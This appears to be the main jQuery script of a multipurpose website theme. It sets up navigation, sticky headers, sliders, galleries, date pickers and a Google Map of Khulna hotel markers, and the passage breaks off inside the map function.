(function($) {

	"use strict";


    /*------------------------------------------
        = FUNCTIONS
    -------------------------------------------*/
    // Check ie and version
    function isIE () {
        var myNav = navigator.userAgent.toLowerCase();
        return (myNav.indexOf('msie') != -1) ? parseInt(myNav.split('msie')[1], 10) : false;
    }


    // Toggle mobile navigation
    function toggleMobileNavigation() {
        var navbar = $(".navigation-holder");
        var openBtn = $(".navbar-header .open-btn");
        var closeBtn = $(".navigation-holder .close-navbar");
        var navLinks = $(".navigation-holder > ul > li > a[href^='#']");

        openBtn.on("click", function() {
            if (!navbar.hasClass("slideInn")) {
                navbar.addClass("slideInn");
            }
            return false;
        })

        closeBtn.on("click", function() {
            if (navbar.hasClass("slideInn")) {
                navbar.removeClass("slideInn");
            }
            return false;            
        })

        navLinks.on("click", function() {
            if (navbar.hasClass("slideInn")) {
                navbar.removeClass("slideInn");
            }
            return false;            
        })
    }

    toggleMobileNavigation();


    // Function for toggle a class for small menu
    function toggleClassForSmallNav() {
        var windowWidth = window.innerWidth;
        var mainNav = $("#navbar > ul");

        if (windowWidth <= 991) {
            mainNav.addClass("small-nav");
        } else {
            mainNav.removeClass("small-nav");
        }
    }

    toggleClassForSmallNav();


    // Function for small menu
    function smallNavFunctionality() {
        var windowWidth = window.innerWidth;
        var mainNav = $(".navigation-holder");
        var smallNav = $(".navigation-holder > .small-nav");
        var subMenu = smallNav.find(".sub-menu");
        var megamenu = smallNav.find(".mega-menu");
        var menuItemWidthSubMenu = smallNav.find(".menu-item-has-children > a");

        if (windowWidth <= 991) {
            subMenu.hide();
            megamenu.hide();
            menuItemWidthSubMenu.on("click", function(e) {
                var $this = $(this);
                $this.siblings().slideToggle();
                 e.preventDefault();
                e.stopImmediatePropagation();
            })
        } else if (windowWidth > 991) {
            mainNav.find(".sub-menu").show();
            mainNav.find(".mega-menu").show();
        }
    }

    smallNavFunctionality();


    //ACTIVE CURRENT MENU WHILE SCROLLING
    // function for active menuitem
    function activeMenuItem($links) {
        var cur_pos = $(window).scrollTop() + 2,
            bottomPosition = $(document).height() - $(window).height() - $(window).scrollTop(),
            sections = $("section"),
            nav = $links,
            nav_height = nav.outerHeight(),
            home = nav.find(" > ul > li:first");

        sections.each(function() {
            var top = $(this).offset().top - nav_height,
                bottom = top + $(this).outerHeight();

            if (cur_pos >= top && cur_pos <= bottom) {
                nav.find("> ul > li > a").parent().removeClass("current-menu-item");
                nav.find("a[href='#" + $(this).attr('id') + "']").parent().addClass("current-menu-item");
            } else if (cur_pos === 2) {
                nav.find("> ul > li > a").parent().removeClass("current-menu-item");
                home.addClass("current-menu-item");
            }
        });
    }


    // smooth-scrolling
    function smoothScrolling($links, $topGap = 0) {
        var links = $links;
        var topGap = $topGap;

        links.on("click", function() {
            if (location.pathname.replace(/^\//,'') === this.pathname.replace(/^\//,'') && location.hostname === this.hostname) {
                var target = $(this.hash);
                target = target.length ? target : $("[name=" + this.hash.slice(1) +"]");
                if (target.length) {
                    $("html, body").animate({
                    scrollTop: target.offset().top - topGap
                }, 1000, "easeInOutExpo");
                    return false;
                }
            }
            return false;
        });
    }



    // Parallax background
    function bgParallax() {
        if ($(".parallax").length) {
            $(".parallax").each(function() {
                var height = $(this).position().top;
                var resize     = height - $(window).scrollTop();
                var doParallax = -(resize/5);
                var positionValue   = doParallax + "px";
                var img = $(this).data("bg-image");

                $(this).css({
                    backgroundImage: "url(" + img + ")",
                    backgroundPosition: "50%" + positionValue,
                    backgroundSize: "cover"
                });
            });
        }
    }


    // Hero slider background setting
    function sliderBgSetting() {
        if (($(".hero-slider .slide").length) || ($(".photography-hero-slider .slide").length)) {
            $(".hero-slider .slide, .photography-hero-slider .slide").each(function() {
                var $this = $(this);
                var img = ($this.find(".slider-bg").attr("src")) ? $this.find(".slider-bg").attr("src") : null ;

                if(img != null) {
                    $this.css({
                        backgroundImage: "url("+ img +")",
                        backgroundSize: "cover",
                        backgroundPosition: "center center"
                    })
                }
            });
        }
    }


    //Setting hero slider
    function heroSlider() {
        if ($(".hero-slider").length) {
            $(".hero-slider").slick({
                autoplay: true,
                autoplaySpeed: 6000,
                pauseOnHover: true,
                arrows: true,
                prevArrow: '<button type="button" class="slick-prev">Previous</button>',
                nextArrow: '<button type="button" class="slick-next">Next</button>',
                dots: true,
                fade: true,
                cssEase: 'linear'
            });
        }
    }

    //Setting hero slider
    function photographyHeroSlider() {
        if ($(".photography-hero-slider").length) {
            $(".photography-hero-slider").slick({
                arrows: true,
                prevArrow: '<button type="button" class="slick-prev">Previous</button>',
                nextArrow: '<button type="button" class="slick-next">Next</button>',
                dots: true,
                fade: true,
                cssEase: 'linear',
                customPaging : function(slider, i) {
                    var thumb = $(slider.$slides[i]).data();
                    if([i].length < 10) {
                        return "<a>"+ "0" + (i+1) + "</a>";
                    } else {
                        return "<a>" + (i+1) + "</a>";
                    }
                },                
            });
        }
    }
    


    /*------------------------------------------
        = HIDE PRELOADER
    -------------------------------------------*/
    function preloader() {
        if($('.preloader').length) {
            $('.preloader').delay(100).fadeOut(500, function() {

                //active wow
                wow.init();

                //Active heor slider
                heroSlider();

                photographyHeroSlider();

            });
        }
    }


    /*------------------------------------------
        = WOW ANIMATION SETTING
    -------------------------------------------*/
    var wow = new WOW({
        boxClass:     'wow',      // default
        animateClass: 'animated', // default
        offset:       0,          // default
        mobile:       true,       // default
        live:         true        // default
    });


    /*------------------------------------------
        = ACTIVE POPUP IMAGE
    -------------------------------------------*/  
    if ($(".fancybox").length) {
        $(".fancybox").fancybox({
            openEffect  : "elastic",
            closeEffect : "elastic",
            wrapCSS     : "project-fancybox-title-style"
        });
    }


    /*------------------------------------------
        = POPUP VIDEO
    -------------------------------------------*/  
    if ($(".video-btn").length) {
        $(".video-btn").on("click", function(){
            console.log("ASdf");
            $.fancybox({
                href: this.href,
                type: $(this).data("type"),
                'title'         : this.title,
                helpers     : {  
                    title : { type : 'inside' },
                    media : {}
                },

                beforeShow : function(){
                    $(".fancybox-wrap").addClass("gallery-fancybox");
                }
            });
            return false
        });    
    }


    /*------------------------------------------
        = ACTIVE GALLERY POPUP IMAGE
    -------------------------------------------*/  
    if ($(".popup-gallery").length) {
        $('.popup-gallery').magnificPopup({
            delegate: 'a',
            type: 'image',
            autoFocusLast: false,

            gallery: {
              enabled: true
            },

            zoom: {
                enabled: true,

                duration: 300,
                easing: 'ease-in-out',
                opener: function(openerElement) {
                    return openerElement.is('img') ? openerElement : openerElement.find('img');
                }
            }
        });    
    }

    $('.popup-gmaps').magnificPopup({
        disableOn: 700,
        type: 'iframe',
        mainClass: 'mfp-fade',
        removalDelay: 160,
        preloader: false,
        fixedContentPos: false
    });

    /*------------------------------------------
        = FUNCTION FORM SORTING GALLERY
    -------------------------------------------*/
    function sortingGallery() {
        if ($(".sortable-gallery .gallery-filters").length) {
            var $container = $('.gallery-container');
            $container.isotope({
                filter:'*',
                animationOptions: {
                    duration: 750,
                    easing: 'linear',
                    queue: false,
                }
            });

            $(".gallery-filters li a").on("click", function() {
                $('.gallery-filters li .current').removeClass('current');
                $(this).addClass('current');
                var selector = $(this).attr('data-filter');
                $container.isotope({
                    filter:selector,
                    animationOptions: {
                        duration: 750,
                        easing: 'linear',
                        queue: false,
                    }
                });
                return false;
            });
        }
    }

    sortingGallery(); 


    /*------------------------------------------
        = MASONRY GALLERY SETTING
    -------------------------------------------*/
    function masonryGridSetting() {
        if ($('.masonry-gallery').length) {
            var $grid =  $('.masonry-gallery').masonry({
                itemSelector: '.grid-item',
                columnWidth: '.grid-item',
                percentPosition: true
            });

            $grid.imagesLoaded().progress( function() {
                $grid.masonry('layout');
            });
        }
    }

    masonryGridSetting();
	
	
    /*------------------------------------------
        = STICKY HEADER
    -------------------------------------------*/

    // Function for clone an element for sticky menu
    function cloneNavForSticyMenu($ele, $newElmClass) {
        $ele.addClass('original').clone().insertAfter($ele).addClass($newElmClass).removeClass('original');
    }

    // clone home style 1 navigation for sticky menu
    if ($('.site-header .navigation').length) {
        cloneNavForSticyMenu($('.site-header .navigation'), "sticky-header");
    }

    // Function for sticky menu
    function stickIt($stickyClass, $toggleClass) {

        if ($(window).scrollTop() >= 300) {
            var orgElement = $(".original");
            var coordsOrgElement = orgElement.offset();
            var leftOrgElement = coordsOrgElement.left;  
            var widthOrgElement = orgElement.css("width");

            $stickyClass.addClass($toggleClass);

            $stickyClass.css({
                "width": widthOrgElement
            }).show();

            $(".original").css({
                "visibility": "hidden"
            });

        } else {

            $(".original").css({
                "visibility": "visible"
            });

            $stickyClass.removeClass($toggleClass);
        }
    }


    /*------------------------------------------
        = HEADER SEARCH AREA
    -------------------------------------------*/
    if ($(".header-search-area").length) {
        var serachFormBox = $(".header-search-area .header-search-form");
        var openSeachBtn = $(".header-search-area .open-btn");
        
        $(document.body).append(serachFormBox);
        serachFormBox.hide();

        openSeachBtn.on("click", function(e) {
            serachFormBox.slideDown();
            return false;
        });

        serachFormBox.on("click", function() {
            serachFormBox.slideUp();
            return false;
        }).find(".form").on("click", function(e) {
            e.stopPropagation();
        })
    }


    /*------------------------------------------
        = FAN FACT COUNT
    -------------------------------------------*/
    if ($(".start-count").length) {
        $('.counter').appear();
        $(document.body).on('appear', '.counter', function(e) {
            var $this = $(this),
            countTo = $this.attr('data-count');

            $({ countNum: $this.text()}).animate({
                countNum: countTo
            }, {
                duration: 3000,
                easing:'linear',
                step: function() {
                    $this.text(Math.floor(this.countNum));
                },
                complete: function() {
                    $this.text(this.countNum);
                }
            });
        });
    }


    /*------------------------------------------
        = BUSINESS TEAM SLIDER
    -------------------------------------------*/
    if ($(".business-team-slider").length) {
        $(".business-team-slider").owlCarousel({
            smartSpeed: 300,
            margin: 30,
            loop:true,
            autoplayHoverPause:true,
            responsive: {
                0 : {
                    items: 1,
                    center: false
                },

                400 : {
                    items: 2,
                    center: false
                },

                992 : {
                    items: 3
                }
            }
        });
    }  


    // Animated scroll business statistic section
    if ($("#scroll").length) {
        $('#scroll').on('click', function(e){     
            e.preventDefault();
            $('html,body').animate({scrollTop:$(this.hash).offset().top - 110}, 1000, "easeInOutExpo");
            return false;
        });
    }



    /*------------------------------------------
        = PARTNERS SLIDER
    -------------------------------------------*/
    if ($(".partners-slider").length) {
        $(".partners-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 300,
            margin: 30,
            loop:true,
            autoplayHoverPause:true,
            dots: false,
            responsive: {
                0 : {
                    items: 2
                },

                400 : {
                    items: 3
                },

                550 : {
                    items: 4
                },

                992 : {
                    items: 5
                }
            }
        });
    }


    /*------------------------------------------
        = BUSINESS TESTIMONIALS SLIDER
    -------------------------------------------*/
    if ($(".business-testimonials-slider").length) {
        $(".business-testimonials-slider").owlCarousel({
            //autoplay:true,
            smartSpeed: 300,
            margin: 30,
            loop:true,
            autoplayHoverPause:true,
            dots: false,
            nav: true,
            navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
            responsive: {
                0 : {
                    items: 1
                },

                768 : {
                    items: 2
                }
            }
        });
    }


    /*------------------------------------------
        = PROGRESS BAR
    -------------------------------------------*/
    function progressBar() {
        if ($(".progress-bar").length) {
            var $progress_bar = $('.progress-bar');
            $progress_bar.appear();
            $(document.body).on('appear', '.progress-bar', function() {
                var current_item = $(this);
                if (!current_item.hasClass('appeared')) {
                    var percent = current_item.data('percent');
                    current_item.append('<span>' + percent + '%' + '</span>').css('width', percent + '%').addClass('appeared');
                }
                
            });
        };
    }

    progressBar();


    /*------------------------------------------
        = FINANCE TESTIMONIALS SLIDER
    -------------------------------------------*/
    if ($(".finance-testimonials-slider").length) {
        $(".finance-testimonials-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 300,
            loop:true,
            autoplayHoverPause:true,
            dots: false,
            nav: true,
            navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
            responsive: {
                0 : {
                    items: 1
                },

                600 : {
                    items: 2
                }
            }
        });
    }


    /*------------------------------------------
        = CONSULTING SERVICES SLIDER
    -------------------------------------------*/
    if ($(".consulting-services-slider").length) {
        $(".consulting-services-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 300,
            loop:true,
            autoplayHoverPause:true,
            responsive: {
                0 : {
                    items: 1
                },

                650 : {
                    items: 2
                },

                1200 : {
                    items: 3
                }
            }
        });
    }


    /*------------------------------------------
        = CONSULTING TESTIMONAILS SLIDER
    -------------------------------------------*/
    if ($(".consulting-testimonials-slider").length) {
        $(".consulting-testimonials-slider").owlCarousel({
            autoplay:true,
            items: 1,
            smartSpeed: 1000,
            loop:true,
            autoplayHoverPause:true,
            dots: false,
            nav: true,
            navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>']
        });
    }


    /*------------------------------------------
        = CONSTRUCTION ABOUT SLIDER
    -------------------------------------------*/
    if ($(".construction-about-slider").length) {
        $('.slider-for').slick({
            slidesToShow: 1,
            slidesToScroll: 1,
            arrows: false,
            fade: true,
            asNavFor: '.slider-nav'
        });
        $('.slider-nav').slick({
            slidesToShow: 5,
            slidesToScroll: 1,
            asNavFor: '.slider-for',
            focusOnSelect: true,

            responsive: [
                {
                  breakpoint: 500,
                  settings: {
                    slidesToShow: 3,
                    infinite: true
                  }
                }
            ]
        });
    }


    /*------------------------------------------
        = CONSULTING TESTIMONIALS SLIDER
    -------------------------------------------*/
    if ($(".construction-testimonials-slider").length) {
        $(".construction-testimonials-slider").owlCarousel({
            autoplay: true,
            smartSpeed: 600,
            margin: 30,
            loop:true,
            autoplayHoverPause:true,
            dots: false,
            nav: true,
            navText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
            responsive: {
                0 : {
                    items: 1
                },

                650 : {
                    items: 2
                }
            }
        });
    }


    /*------------------------------------------
        = CONSULTING RECENT PROJECTS
    -------------------------------------------*/
    function setMcustomScrollBar($selector) {
        var selector = $selector,
            windowWidth = window.innerWidth;

        if((selector.length) && (windowWidth >= 768)) {
            selector.addClass("mCustomScrollbar _mCS_1");
            selector.mCustomScrollbar({
                axis:"x",
                advanced:{
                    autoExpandHorizontalScroll: true
                },
                mouseWheel: "disable"
            });
        } else {
            selector.removeClass("mCustomScrollbar _mCS_1");
            selector.mCustomScrollbar("destroy");
        }
    }

    if($(".construction-projects-grids").length) {
        setMcustomScrollBar($(".construction-projects-grids"));
    }


    /*------------------------------------------
        = CONSTRUCTION TEAM SLIDER
    -------------------------------------------*/  
    if($(".construction-team-slider".length)) {
        $(".construction-team-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 300,
            margin: 30,
            loop:true,
            autoplayHoverPause:true,
            nav: true,
            navText: ['<i class="fa fa-arrow-left">','<i class="fa fa-arrow-right">'],
            dots: false,
            responsive: {
                0 : {
                    items: 1
                },

                450 : {
                    items: 2
                },

                700 : {
                    items: 3
                }
            }
        });
    }


    /*------------------------------------------
        =   BLOG SLIDER
    -------------------------------------------*/  
    if($(".blog-slider".length)) {
        $(".blog-slider").owlCarousel({
            autoplay:true,
            items: 1,
            smartSpeed: 500,
            loop:true,
            autoplayHoverPause:true,
            dots: false,
            nav: true,
            navText: ['<i class="fa fa-angle-left">','<i class="fa fa-angle-right">'],
        });
    }


    /*------------------------------------------
        = ATTORNEYS SLIDER
    -------------------------------------------*/  
    if($(".attorneys-slider".length)) {
        $(".attorneys-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 300,
            margin: 30,
            loop:true,
            autoplayHoverPause:true,
            responsive: {
                0 : {
                    items: 1
                },

                550 : {
                    items: 2
                },

                992 : {
                    items: 3
                }
            }
        });
    }


    /*------------------------------------------
        = EVENT START CLOCK
    -------------------------------------------*/  
    if ($("#event-start-clock").length) {
        $('#event-start-clock').countdown('2018/06/31', function(event) {
            var $this = $(this).html(event.strftime(''
            + '<div class="box"><span>Days</span> <div>%D</div></div>'
            + '<div class="box"><span>Hours</span> <div>%H </div></div>'
            + '<div class="box"><span>Mins</span> <div>%M</div></div>'
            + '<div class="box"><span>Secs</span> <div>%S</div></div>'));
        });
    }


    /*------------------------------------------
        = EVENT TESTIMONIALS SLIDER
    -------------------------------------------*/  
    if($(".event-testimonials-slider".length)) {
        $(".event-testimonials-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 500,
            loop:true,
            autoplayHoverPause:true,
            items: 1,
            dots: false,
        });
    }


    /*------------------------------------------
        = APP LANDING TESTIMONIALS SLIDER
    -------------------------------------------*/  
    if($(".app-landing-testimonials-slider".length)) {
        $(".app-landing-testimonials-slider").owlCarousel({
            autoplay:true,
            loop: true,
            smartSpeed: 1000,
            loop:true,
            autoplayHoverPause:true,
            items: 1,
            dots: false,
            nav: true,
            navText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
        });
    }


    /*------------------------------------------
        = APP LANDING SCREENSHOT SLIDER
    -------------------------------------------*/  
    // if($(".app-landing-screenshot-slider".length)) {
    //     $(".app-landing-screenshot-slider").owlCarousel({
    //         autoplay:true,
    //         loop: true,
    //         smartSpeed: 1000,
    //         loop:true,
    //         autoplayHoverPause:true,
    //         //items: 1,
    //         dots: false,
    //         nav: true,
    //         navText: ['<i class="fa fa-long-arrow-left"></i> PREV', 'NEXT <i class="fa fa-long-arrow-right"></i>'],
    //     });
    // }

    if ($(".app-screenshot-slider").length) {
        $(".app-screenshot-slider").owlCarousel({
            loop:true,
            margin:50,
            items: 1,
            smartSpeed: 700,
            autoplay: false,
            dots: false,
            nav:true,
            navText: [ '<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>' ],
        });
    }
    


    /*------------------------------------------
        = MINIMAL PORTFOLIO TESTIMONIALS SLIDER
    -------------------------------------------*/
    if ($(".minimal-portfolio-testimonials-slider").length) {
        $(".minimal-portfolio-testimonials-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 1000,
            margin: 30,
            loop:true,
            autoplayHoverPause:true,
            dots: false,
            nav: true,
            navText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
            responsive: {
                0 : {
                    items: 1
                },

                992 : {
                    items: 2
                }
            }
        });
    }


    /*------------------------------------------
        = SERMONS SLIDER
    -------------------------------------------*/
    if ($(".sermons-slider").length) {
        $(".sermons-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 600,
            margin: 30,
            loop:true,
            autoplayHoverPause:true,
            responsive: {
                0 : {
                    items: 1
                },

                650 : {
                    items: 2
                },

                1200 : {
                    items: 3
                }
            }
        });
    }


    /*------------------------------------------
        = CHURCH UPCOMMING EVENT SLIDER
    -------------------------------------------*/
    if ($(".church-upcoming-events-slider").length) {
        $(".church-upcoming-events-slider").slick({
            slidesToShow: 3,
            centerPadding: "10px",
            infinite: true,
            pauseOnHover: false,
            vertical: true,
            dots: true,
            arrows: false,
            focusOnSelect: false,
            adaptiveHeight: true,
        });   
    }



    /*------------------------------------------
        = CHARCH QUOTE SLIDER
    -------------------------------------------*/
    if ($(".charch-quote-slider").length) {
        $(".charch-quote-slider").owlCarousel({
            autoplay:true,
            items: 1,
            smartSpeed: 1000,
            loop:true,
            autoplayHoverPause:true,
            dots: false,
            nav: true,
            navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
        });
    }


    /*------------------------------------------
        = CHARCH QUOTE SLIDER
    -------------------------------------------*/
    if ($(".church-causes-slider").length) {
        $(".church-causes-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 1000,
            loop:true,
            autoplayHoverPause:true,
            margin: 30,
            dots: false,
            nav: true,
            navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
            responsive: {
                0 : {
                    items: 1
                },

                700 : {
                    items: 2
                },

                1200 : {
                    items: 3
                }
            }
        });
    }


    /*------------------------------------------
        = HOTEM HOME RESERVATION CALENDER
    -------------------------------------------*/
    if($(".calender-date").length) {
        $(".calender-date").each(function() {
            var dateNow = new Date();
            var locale = "en-us";
            var curMonth = dateNow.toLocaleString(locale, {month: "long"});
            var curDay = dateNow.getDate();
            var month = $(".cur-month");
            var day = $(".cur-day");
            month.text(curMonth);
            day.text(curDay);

            $(".calender-date").datetimepicker({
                icons: {
                    time: "fa fa-clock-o",
                    date: "fa fa-calendar",
                    up: "fa fa-arrow-up",
                    down: "fa fa-arrow-down"
                },
                format: 'DD MMMM YYYY',
                defaultDate:dateNow

            });

            $(".calender-date").on("dp.change", function(e) {
                $(".calender-date").each(function() {
                    var $this = $(this);
                    var string = $this.val();
                    var newarray = string.split(" ");
                    var month = $this.siblings(".month-day").find(".cur-month");
                    var day = $this.siblings(".month-day").find(".cur-day");

                    for (var i = 0; i < newarray.length; i++) {
                        month.text(newarray[1]);
                        day.text(newarray[0]);
                    }
                })
            });
        });
    }

    // if($(".calender-date").length) {
    //     $(".calender-date").each(function() {
    //         var dateNow = new Date();
    //         $(".calender-date").datetimepicker({
    //             icons: {
    //                 time: "fa fa-clock-o",
    //                 date: "fa fa-calendar",
    //                 up: "fa fa-arrow-up",
    //                 down: "fa fa-arrow-down"
    //             },
    //             format: 'DD MMMM YYYY',
    //             defaultDate:dateNow

    //         });

    //         $(".calender-date").on("dp.change", function(e) {
    //             $(".calender-date").each(function() {
    //                 var $this = $(this);
    //                 var string = $this.val();
    //                 var newarray = string.split(" ");
    //                 var month = $this.siblings(".month-day").find(".cur-month");
    //                 var day = $this.siblings(".month-day").find(".cur-day");

    //                 console.log(month);

    //                 for (var i = 0; i < newarray.length; i++) {
    //                     month.text(newarray[1]);
    //                     day.text(newarray[0]);
    //                 }
    //             })
    //         });
    //     });
    // }


    /*------------------------------------------
        = HOTEL DEAL SLIDER
    -------------------------------------------*/
    if ($(".hotel-deal-slider").length) {
        $(".hotel-deal-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 1000,
            items: 1,
            loop:true,
            autoplayHoverPause:true,
        });
    }


    /*------------------------------------------
        = CHARCH QUOTE SLIDER
    -------------------------------------------*/
    if ($(".hotel-dining-slider").length) {
        $(".hotel-dining-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 1000,
            loop:true,
            autoplayHoverPause:true,
            dots: false,
            responsive: {
                0 : {
                    items: 1
                },

                550 : {
                    items: 2
                },

                768 : {
                    items: 3
                },

                992 : {
                    items: 4
                },

                1400 : {
                    items: 5
                }
            }
        });
    }


    /*------------------------------------------
        = HOTEL TESTIMONIALS SLIDER
    -------------------------------------------*/
    if ($(".hotel-testimonials-slider").length) {
        $(".hotel-testimonials-slider").slick({
            slidesToShow: 2,
            infinite: true,
            pauseOnHover: false,
            vertical: true,
            dots: true,
            arrows: false,
            focusOnSelect: false,
            adaptiveHeight: true,
            responsive: [
                {
                    breakpoint: 450,
                    settings: "unslick"
                },
            ]
        });   
    }


    /*------------------------------------------
        = MEDICAL DEPARTMENTS SLIDER
    -------------------------------------------*/
    if ($(".medical-departments-slider").length) {
        $(".medical-departments-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 1000,
            loop:true,
            autoplayHoverPause:true,
            margin: 25,
            dots: false,
            nav: true,
            navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
            responsive: {
                0 : {
                    items: 1
                },

                550 : {
                    items: 2
                },

                768 : {
                    items: 2
                },

                1200 : {
                    items: 3
                },
            }
        });
    }


    /*------------------------------------------
        = MEDICAL APPOINTMENT DATE PICKER
    -------------------------------------------*/
    if ($("#medical-datetime-picker").length) {
        $('#medical-datetime-picker').datetimepicker();
    }


    /*------------------------------------------
        = MEDICAL DOCTORS SLIDER
    -------------------------------------------*/
    if ($(".medical-doctors-slider").length) {
        $(".medical-doctors-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 500,
            loop:true,
            autoplayHoverPause:true,
            margin: 25,
            responsive: {
                0 : {
                    items: 1
                },

                550 : {
                    items: 2
                },

                768 : {
                    items: 3
                },

                1200 : {
                    items: 4
                },
            }
        });
    }


    /*------------------------------------------
        = GYM PROGRAMS SLIDER
    -------------------------------------------*/
    if ($(".gym-programs-slider").length) {
        $(".gym-programs-slider").owlCarousel({
            autoplay:true,
            smartSpeed: 500,
            loop:true,
            autoplayHoverPause:true,
            responsive: {
                0 : {
                    items: 1
                },

                550 : {
                    items: 2
                },

                768 : {
                    items: 3
                },

                1200 : {
                    items: 5
                },

                1500 : {
                    items: 6
                },
            }
        });
    }


    /*------------------------------------------
        = GYM GALLERY SLIDER
    -------------------------------------------*/
    if ($(".gym-gallery-slider").length) {
        $(".gym-gallery-slider").owlCarousel({
            //autoplay:true,
            smartSpeed: 500,
            loop:true,
            center: true,
            dots: false,
            nav: true,
            navText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],            
            autoplayHoverPause:true,
            responsive: {
                0 : {
                    items: 1
                },

                550 : {
                    items: 2
                },

                768 : {
                    items: 3
                },

                1200 : {
                    items: 5
                }
            }
        });
    }


    /*------------------------------------------
        = GYM TESTIMONIALS SLIDER
    -------------------------------------------*/
    if ($(".gym-testimonials-slider").length) {
        $(".gym-testimonials-slider").owlCarousel({
            autoplay: true,
            smartSpeed: 600,
            margin: 30,
            loop:true,
            autoplayHoverPause:true,
            responsive: {
                0 : {
                    items: 1
                },

                650 : {
                    items: 2
                },

                1200 : {
                    items: 3
                }
            }
        });
    }


    /*------------------------------------------
        = RESTAURANT RESERVE DATE PICKER
    -------------------------------------------*/
    if($("#restaurant-reserve-datetime-picker").length) {
        $('#restaurant-reserve-datetime-picker').datetimepicker();
    }


    /*------------------------------------------
        = RESTAURANT RESERVE TIME PICKER
    -------------------------------------------*/
    if($('#restaurant-reserve-time').length) {
        $('#restaurant-reserve-time').clockpicker({
            placement: 'bottom',
            align: 'left',
            autoclose: true,
            'default': 'now'
        });
    }


    /*------------------------------------------
        = RESTAURANT CHEFS SLIDER
    -------------------------------------------*/
    if($(".restaurant-chefs-slider").length) {
        $(".restaurant-chefs-slider").owlCarousel({
            autoplay: true,
            smartSpeed: 600,
            margin: 30,
            stagepadding: 10,
            loop:true,
            autoplayHoverPause:true,
            nav: true,
            navText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
            responsive: {
                0 : {
                    items: 1
                },

                650 : {
                    items: 2
                },

                1200 : {
                    items: 2
                }
            }
        });
    }


    /*------------------------------------------
        = RESTAURANT TESTIMONIALS SLIDER
    -------------------------------------------*/
    if($(".restaurant-testimonials-slider").length) {
        $(".restaurant-testimonials-slider").owlCarousel({
            autoplay: true,
            smartSpeed: 600,
            margin: 30,
            loop:true,
            autoplayHoverPause:true,
            nav: true,
            navText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
            responsive: {
                0 : {
                    items: 1
                },

                992 : {
                    items: 2
                }
            }
        });
    }


    /*------------------------------------------
        = PHOTOGRAPHY BLOG SLIDER
    -------------------------------------------*/
    if($(".photography-blog-slider").length) {
        $(".photography-blog-slider").owlCarousel({
            autoplay: true,
            smartSpeed: 600,
            loop:true,
            autoplayHoverPause:true,
            dots: false,
            nav: true,
            navText: ['<i class="fa fa-long-arrow-left"></i>', '<i class="fa fa-long-arrow-right"></i>'],
            responsive: {
                0 : {
                    items: 1
                },

                500 : {
                    items: 2
                },

                992 : {
                    items: 3
                },

                1200 : {
                    items: 4
                }
            }
        });
    }


    /*------------------------------------------
        = AGENCY TESTIMONAILS SLIDER
    -------------------------------------------*/
    if ($(".agency-testimonials-slider").length) {
        $(".agency-testimonials-slider").owlCarousel({
            autoplay:true,
            items: 1,
            smartSpeed: 1000,
            loop:true,
            autoplayHoverPause:true,
            dots: false,
            nav: true,
            navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>']
        });
    }


    /*------------------------------------------
        = AGENCY TEAM SLIDER
    -------------------------------------------*/
    if ($(".agency-team-slider").length) {
        $(".agency-team-slider").owlCarousel({
            // autoplay:true,
            smartSpeed: 300,
            margin: 30,
            loop:true,
            autoplayHoverPause:true,
            responsive: {
                0 : {
                    items: 1,
                    center: false
                },

                551 : {
                    items: 2,
                    center: false
                },

                992 : {
                    items: 3
                }
            }
        });
    } 


    /*------------------------------------------
        = SEO SERVICES SLIDER
    -------------------------------------------*/
    if ($(".seo-services-slider").length) {
        $(".seo-services-slider").owlCarousel({
            // autoplay:true,
            smartSpeed: 300,
            margin: 30,
            loop:true,
            autoplayHoverPause:true,
            nav: true,
            navText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
            responsive: {
                0 : {
                    items: 1,
                },

                500 : {
                    items: 2,
                },

                992 : {
                    items: 3,
                },

                1200 : {
                    items: 4
                }
            }
        });
    } 


    /*------------------------------------------
        = SEO TESTIMONIALS SLIDER
    -------------------------------------------*/
    if ($(".seo-testimonials-slider").length) {
        $(".seo-testimonials-slider").owlCarousel({
            // autoplay:true,
            items: 1,
            smartSpeed: 300,
            loop:true,
            autoplayHoverPause:true,
            nav: true,
            navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
            dots: false
        });
    } 



    


    /*------------------------------------------
        = GOOGLE MAP
    -------------------------------------------*/  
    function map(MapId) {

        var locations = [
            ['Hotel royal international khulna ', 22.8103888, 89.5619609,1],
            ['City inn khulna', 22.820884, 89.551216,2],
        ];

        var map = new google.maps.Map(document.getElementById(MapId), {
            center: new google.maps.LatLng( 22.8103888, 89.5619609),
            zoom: 12,
            scrollwheel: false,
            mapTypeId: google.maps.MapTypeId.ROADMAP

        });

        var infowindow = new google.maps.InfoWindow();

        var marker, i;

        for (i = 0; i < locations.length; i++) {  
                marker = new google.maps.Marker({
                position: new google.maps.LatLng(locations[i][1], locations[i][2]),
                map: map,
                icon:'assets/images/map-marker.png'
            });

